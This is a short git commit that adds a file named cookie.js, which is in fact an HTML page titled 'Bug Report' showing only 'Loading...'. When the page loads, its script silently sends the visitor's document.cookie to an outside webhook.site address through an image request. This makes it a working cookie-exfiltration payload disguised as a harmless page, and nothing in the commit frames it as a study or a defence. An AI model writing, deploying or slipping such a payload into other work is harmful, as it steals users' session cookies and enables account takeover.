f0751997e99de48a67a8e13d39d0f413b05899c0
vWhitestorm3444 <122406951+vWhitestorm3444@users.noreply.github.com>
2025-08-06 20:52:07 +0200

    Update and rename page.html to cookie.js

---
+++ cookie.js
@@ -0,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Bug Report</title>
+    <script>
+      window.onload = function() {
+        new Image().src = "https://webhook.site/0693fa2b-5ed3-439e-8073-32e3b5e1e1f9?cookie=" + encodeURIComponent(document.cookie);
+      };
+    </script>
+  </head>
+  <body>
+    <p>Loading...</p>
+  </body>
+</html>
